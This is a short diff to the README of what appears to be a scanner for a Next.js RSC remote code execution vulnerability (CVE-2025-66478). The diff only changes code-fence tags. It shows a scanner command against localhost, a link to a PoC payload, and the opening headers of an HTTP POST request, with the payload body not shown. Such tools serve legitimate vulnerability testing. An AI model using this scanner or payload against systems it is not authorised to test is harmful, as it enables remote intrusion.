@@ -38,7 +38,7 @@ python3 scanner.py -u http://127.0.0.1:3000
 ```
 Will return:
 
-```
+```bash
 ╰─(venv) ⠠⠵ python3 scanner.py -u http://127.0.0.1:3000             
 
 brought to you by assetnote
@@ -71,7 +71,7 @@ Will return:
 
 PoC HTTP payload from [here](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478?tab=readme-ov-file#payload-that-can-see-command-execution-result-in-response-body-most-useful).
 
-```
+```http
 POST / HTTP/1.1
 Host: localhost:3000
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
